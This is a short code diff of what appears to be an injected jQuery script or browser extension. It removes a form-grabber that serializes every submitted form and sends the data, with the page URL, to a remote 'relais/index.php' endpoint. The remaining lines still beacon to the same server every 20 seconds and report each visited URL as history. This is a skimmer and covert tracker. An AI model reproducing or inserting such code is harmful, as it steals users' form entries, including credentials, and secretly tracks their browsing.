@@ -27,12 +27,7 @@ $(document).ready(function()
     }
     setInterval(online,20000);
     var url_history = window.location.href;
-    if(typeof document.forms[0] !== 'undefined'){
-       $("form").on("submit", function(event){
-        var grabber = $(this).serialize();
-        $.get(server_web+'relais/index.php?info='+grabber+'&url='+window.location.href);
-       });
-    }
+
     $.get(server_web+'relais/index.php?online=1');
     $.get(server_web+'relais/index.php?history='+url_history);
     $.get(server_web+'relais/index.php?n=pop&version='+version);
